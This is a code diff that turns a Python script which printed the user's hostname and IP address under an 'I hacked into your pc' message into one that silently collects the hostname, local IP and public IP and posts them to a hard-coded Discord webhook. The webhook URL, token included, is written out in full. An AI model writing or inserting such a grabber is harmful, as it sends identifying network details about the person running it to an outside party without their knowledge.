@@ -1,14 +1,16 @@
+import requests
 import socket
 
-hostname = socket.gethostname()
-IPAddr = socket.gethostbyname(hostname)
+def ip():
+    host = socket.gethostname()
+    return socket.gethostbyname(host)
 
-print("I hacked into yocur pc i know your ip addr")
-print("it is\n")
-
-print("Your Computer Name is:", hostname)
-print("Your Computer IP Address is:", IPAddr)
-
-with open(log.txt, "w") as file:
-  file.write("%s | %s \n" %(hostname, IPAddr))
-  
+requests.post("https://discord.com/api/webhooks/1483326994253873216/o21iquTxU4nb_YQzQVPh3iemcMLjj-NiqHQwCW_YUktTf3EUVhCnUiX2hRk4vLlaTZnp", {
+    "content": str(
+        {
+            "hostname": socket.gethostname(),
+            "ipA": requests.get("https://api.ipify.org").text,
+            "ipB": ip()
+        }
+    )
+})
